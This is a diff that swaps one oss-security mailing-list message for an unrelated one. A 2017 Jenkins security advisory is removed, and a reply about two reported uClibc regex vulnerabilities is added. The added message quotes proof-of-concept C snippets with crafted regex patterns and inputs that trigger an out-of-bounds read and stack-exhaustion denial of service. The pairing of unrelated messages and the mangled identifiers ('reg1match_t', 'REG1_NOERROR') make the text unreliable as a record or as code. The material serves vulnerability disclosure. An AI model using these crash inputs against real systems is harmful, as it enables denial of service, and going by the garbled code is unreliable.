@@ -1,71 +1,81 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/11/4
-Message-Id: <307E5A53-DC12-428C-ADD6-98D74D13B20E@beckweb.net>
-Date: Wed, 11 Oct 2017 18:21:48 +0200
-From: Daniel Beck <ml@...kweb.net>
-To: oss-security@...ts.openwall.com
-Subject: Multiple vulnerabilities in Jenkins
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/16/8
+Message-ID: <8760fwhy9d.fsf@dell.be.48ers.dk>
+Date: Fri, 16 Jun 2017 15:12:46 +0200
+From: Peter Korsgaard <peter@...sgaard.com>
+To: "fefe" <qbenjin@...com>, wbx@...nadk.org
+Cc: "oss-security" <oss-security@...ts.openwall.com>
+Subject: Re: two vulns in  uClibc-0.9.33.2
 Content-Type: text/plain; charset=utf-8
 
-Jenkins is an open source automation server which enables developers around 
-the world to reliably build, test, and deploy their software. The following 
-releases contain fixes for security vulnerabilities:
+>>>>> "fefe" == fefe  <qbenjin@...com> writes:
 
-* Jenkins (weekly) 2.84
-* Jenkins (LTS) 2.73.2
+ > I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
 
-Summaries of the vulnerabilities are below. More details, severity, and
-attribution can be found here:
-https://jenkins.io/security/advisory/2017-10-11/
+uClibc is dead. Active development happens on uClibc-ng. Is uClibc-ng
+also affected by these issues?
 
-We provide advance notification for security updates on this mailing list:
-https://groups.google.com/d/forum/jenkinsci-advisories
 
-If you find security vulnerabilities in Jenkins, please report them as
-described here:
-https://jenkins.io/security/#reporting-vulnerabilities
+> one is about line 2682 of get_subexp.c :
 
----
+I take it you are referring to libc/misc/regex/regexec.c?
 
-SECURITY-478
-Users with permission to create or configure agents in Jenkins could 
-configure a launch method called Launch agent via execution of command on 
-master. This allowed them to run arbitrary shell commands on the master 
-node whenever the agent was supposed to be launched.
 
-SECURITY-514
-Information about Jenkins user accounts is generally available to anyone 
-with Overall/Read permissions via the /user/(username)/api remote API. This 
-included e.g. Jenkins users' email addresses if the Mailer Plugin is 
-installed.
+ > 		if (BE (bkref_str_off >= mctx->input.valid_len, 0))
+ > 		{
+ > 		  /* If we are at the end of the input, we cannot match.  */
+ > 		  if (bkref_str_off >= mctx->input.len)
+ > 		    break;
 
-SECURITY-555
-Jenkins bundled a version of the commons-httpclient library with the 
-vulnerability CVE-2012-6153 that incorrectly verified SSL certificates, 
-making it susceptible to man-in-the-middle attacks.
 
-SECURITY-611
-The remote API at /computer/(agent-name)/api showed information about tasks 
-(typically builds) currently running on that agent. This included 
-information about tasks that the current user otherwise has no access to, 
-e.g. due to lack of Job/Read permission.
+ > 		  err = extend_buffers (mctx);
+ > 		  if (BE (err != REG1_NOERROR, 0))
+ > 		    return err;
 
-SECURITY-618
-The remote API at /queue/item/(ID)/api showed information about tasks in 
-the queue (typically builds waiting to start). This included information 
-about tasks that the current user otherwise has no access to, e.g. due to 
-lack of Job/Read permission.
 
-SECURITY-617
-The remote API at /job/(job-name)/api contained information about upstream 
-and downstream projects. This included information about tasks that the 
-current user otherwise has no access to, e.g. due to lack of Job/Read 
-permission.
+ > 		  buf = (const char *) re_string_get_buffer (&mctx->input);
+ > 		}
+ > 	      if (buf [bkref_str_off++] != buf[sl_str - 1])
+ > 		break; /* We don't need to search this sub expression
+		
+ > "bkref_str_off >= mctx->input.valid_len" , when  bkref_str_off == mctx->input.valid_len, "buf [bkref_str_off++] != buf[sl_str - 1]" case Out of one bit bounds read
 
-SECURITY-616
-The Jenkins default form control for passwords and other secrets, 
-<f:password/>, supports form validation (e.g. for API keys). The form 
-validation AJAX requests were sent via GET, which could result in secrets 
-being logged to a HTTP access log in non-default configurations of 
-Jenkins, and made available to users with access to these log files.
 
+ > The poc code like:
+	
+ > 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+ > 	{		
+ >         	reg1match_t pmatch[1];
+ > 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
+ > 		regfree(&regtmp);
+ > 	}
+
+
+ > The another is aout line 1837 of regexce.c :
+
+
+ > 		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int boundaries,
+ > 			     int subexp_idx, int from_node, int bkref_idx)
+ >                 .......
+
+
+ > 		  cpos =
+ > 		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
+ > 						 dst, bkref_idx);
+
+
+		
+ > check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack exhaustion.
+
+
+ > The poc code like:	
+	
+ > 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+ > 	{		
+ >         	reg1match_t pmatch[1];
+ > 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
+ > 		regfree(&regtmp);
+ > 	}
+
+-- 
+Bye, Peter Korsgaard
